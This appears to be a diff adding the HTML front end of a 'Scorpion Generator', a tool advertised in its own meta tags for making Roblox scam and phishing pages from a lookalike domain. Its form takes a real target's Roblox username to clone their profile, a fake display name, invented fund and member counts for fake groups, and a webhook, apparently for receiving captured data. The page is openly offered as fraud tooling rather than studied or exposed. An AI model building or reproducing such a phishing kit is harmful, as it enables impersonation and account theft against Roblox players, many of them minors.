@@ -1,0 +1,215 @@
+<head>
+    <meta charset="UTF-8">
+    <script type="text/javascript" src="https://me.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=BbQG76G0GiBoc492z3K9G5vBvXcTMEBEfH4FfjEx-wLIgJGQuPo30pPErE1eRqvodRtJh3eUTUnQKv4HD0sARSg0Mgy0EPInMMI61-obUDzYlWGJYvh64tdecRz4SwTopvjVLcKtj3NhGztVOfa3AQ" charset="UTF-8"></script><script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <meta property="og:title" content="Ultimate Scorpion Generator Scampage" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://https-web-roblox.com/create/" />
+    <meta property="og:description" content="Make your Scampage or phishing site with the click of a button! discord.gg/tywt7mranF" />
+    <meta property="og:image" content="http://https-web-roblox.com/scrpion.png" />
+    <meta name="theme-color" content="#FF6C00">
+    <meta name="keywords" content="phising sites, roblox, roblox scam, roblox scampage, roblox fake links, roblox">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Generator</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.0/normalize.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lykmapipo/themify-icons@0.1.2/css/themify-icons.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pixeden-stroke-7-icon@1.2.3/pe-icon-7-stroke/dist/pe-icon-7-stroke.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.0/css/flag-icon.min.css">
+    <link rel="stylesheet" href="dashboard-page/assets/css/cs-skin-elastic.css">
+    <link rel="stylesheet" href="dashboard-page/assets/css/style.css">
+    <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/html5shiv/3.7.3/html5shiv.min.js"></script> -->
+    <link href="https://cdn.jsdelivr.net/npm/chartist@0.11.0/dist/chartist.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/jqvmap@1.5.1/dist/jqvmap.min.css" rel="stylesheet">
+
+    <link href="https://cdn.jsdelivr.net/npm/weathericons@2.1.0/css/weather-icons.css" rel="stylesheet" />
+    <link href="https://cdn.jsdelivr.net/npm/fullcalendar@3.9.0/dist/fullcalendar.min.css" rel="stylesheet" />
+
+   <style>
+    #weatherWidget .currentDesc {
+        color: #ffffff!important;
+    }
+        .traffic-chart {
+            min-height: 335px;
+        }
+        #flotPie1  {
+            height: 150px;
+        }
+        #flotPie1 td {
+            padding:3px;
+        }
+        #flotPie1 table {
+            top: 20px!important;
+            right: -10px!important;
+        }
+        .chart-container {
+            display: table;
+            min-width: 270px ;
+            text-align: left;
+            padding-top: 10px;
+            padding-bottom: 10px;
+        }
+        #flotLine5  {
+             height: 105px;
+        }
+
+        #flotBarChart {
+            height: 150px;
+        }
+        #cellPaiChart{
+            height: 160px;
+        }
+
+    </style>
+</head>
+<body>
+<script>
+    function websiteRoblox(that) {
+    if (that.value == "1") {
+        document.getElementById("input-azka-profile").style.display = "block";
+    } else {
+        document.getElementById("input-azka-profile").style.display = "none";
+    }
+    if (that.value == "2") {
+        document.getElementById("input-azka-vip").style.display = "block";
+    } else {
+        document.getElementById("input-azka-vip").style.display = "none";
+    }
+    if (that.value == "3") {
+        document.getElementById("input-azka-group").style.display = "block";
+    } else {
+        document.getElementById("input-azka-group").style.display = "none";
+    }
+}
+</script>
+<script>
+function azka_gans_btw() {
+  document.getElementById('loading-submit').style.display = "none";
+  document.getElementById('submit').style.display = "block";
+  setTimeout(function() {
+    document.getElementById('submit').style.display = "none";
+    document.getElementById('loading-submit').style.display = "block";
+  });
+}
+</script>
+<div class="row">
+                    <div class="col-lg-12">
+                        <div class="card">
+                            <div class="card-header">
+                                    <strong class="card-title"><center>Ultimate Scorpion Generator</center></strong>
+                                </div>
+                                <div class="card-body">
+                   <div class="row">                 
+<div class="col-lg-6">
+        <form action="" method="post">
+<div class="form-group">
+                                            <select onchange="websiteRoblox(this);" name="ChooseView" id="select" class="form-control">
+                                                <option value="0">Choose View</option>
+                                                <option value="1">Profile</option>
+                                                <option value="2">Private Server</option>
+                                                <option value="3">Group</option>
+                                            </select>
+                                        </div>
+<div id="input-azka-vip" style="display: none;">
+<div class="form-group">
+                                    <div class="input-group">
+                                        <input type="text" name="gameid" placeholder="Game Id" class="form-control">
+                                        <div class="input-group-addon"><i class="fa fa-user"></i></div>
+                                    </div>
+                                    <small>example: <strong><a style="color:black;" href="ex.png">Click Here</a></strong></small>
+                                </div>
+</div>
+<div id="input-azka-profile" style="display: none;">
+<div class="form-group">
+                                    <div class="input-group">
+                                        <input type="text" name="username_rblx" placeholder="Target Username ROBLOX" class="form-control">
+                                        <div class="input-group-addon"><i class="fa fa-user"></i></div>
+                                    </div>
+                                </div>
+<div class="form-group">
+                                    <div class="input-group">
+                                        <input type="text" name="username_scampage" placeholder="Username for scampage" class="form-control">
+                                        <div class="input-group-addon"><i class="fa fa-user"></i></div>
+                                    </div>
+                                    <small>example: SexyGirls444</small>
+                                </div>
+</div>
+<div id="input-azka-group" style="display: none;">
+<div class="form-group">
+                                    <div class="input-group">
+                                        <input type="number" name="funds" placeholder="Amount of funds" class="form-control">
+                                        <div class="input-group-addon"><i class="fa fa-dollar"></i></div>
+                                    </div>
+                                </div>
+<div class="form-group">
+                                    <div class="input-group">
+                                        <input type="text" name="owner_groups" placeholder="Owner group name" class="form-control">
+                                        <div class="input-group-addon"><i class="fa fa-user"></i></div>
+                                    </div>
+                                </div>
+<div class="form-group">
+                                    <div class="input-group">
+                                        <input type="text" name="name_groups" placeholder="Group Name" class="form-control">
+                                        <div class="input-group-addon"><i class="fa fa-users"></i></div>
+                                    </div>
+                                </div>
+<div class="form-group">
+                                    <div class="input-group">
+                                        <input type="number" name="t-member" placeholder="Amount of members" class="form-control">
+                                        <div class="input-group-addon"><i class="fa fa-users"></i></div>
+                                    </div>
+                                </div>
+<div class="form-group">
+                                    <div class="input-group">
+                                        <input type="url" name="background_group" placeholder="Group Logo/Thumbnail" class="form-control">
+                                        <div class="input-group-addon"><i class="fa fa-picture-o"></i></div>
+                                        </div>
+                                        <small>example: <a href="https://doy2mn9upadnk.cloudfront.net/uploads/default/optimized/4X/f/7/c/f7c9f2a9f31bf5748c52fa1087126828a5333ac8_2_500x500.png">here</a></small>
+                                </div>
+</div>
+<div class="form-group">
+                                    <div class="input-group">
+                                        <input type="text" name="webhook" placeholder="Webhook" class="form-control">
+                                        <div class="input-group-addon"><i class="fa fa-cloud"></i></div>
+                                    </div>
+                                </div>
+<div class="form-group">
+                                <div class="g-recaptcha" data-sitekey="6LdbhJsaAAAAAMEDofYsnE8OAFBHlRbzOBJeLdgM"></div>
+                                </div>
+
+<div id="submit" class="text-right">
+    <button onclick="azka_gans_btw()" id="payment-button" name="buyweb" type="submit" class="btn btn-lg btn-info btn-block">
+                                                    <i class="fa fa-lock fa-lg"></i>&nbsp;
+                                                    <span id="payment-button-amount">Generate</span>
+                                                </button>
+</div>
+<div id="loading-submit" class="text-right" style="display: none;">
+    <button id="payment-button" name="buyweb" type="submit" class="btn btn-lg btn-info btn-block" disabled>
+                                                    <i class="fa fa-refresh fa-lg fa-spin"></i>&nbsp;
+                                                    <span id="payment-button-amount">Processing</span>
+                                                </button>
+</div>
+</form>
+</div>
+
+<div class="col-md-6">
+                        <div class="card">
+                            <div class="card-header">
+                                <strong class="card-title">Information! </strong>
+                            </div>
+                            <div class="card-body">
+                                <p class="card-text"><strong>Target Username ROBLOX</strong> is Username on Roblox to take a profile photo, avatar, number of followers, number of following, number of friends, about, status, and others..</p>
+                                <p class="card-text"><strong>Username for scampage</strong> is to be posted on a fake website or <strong>Censored Required</strong scampage..</p>
+                            </div>
+                        </div>
+                    </div>
+</div>
+
+</div>
+
+ </div>
+                            </div> 
+                            
+                        </div>
+                        </body>
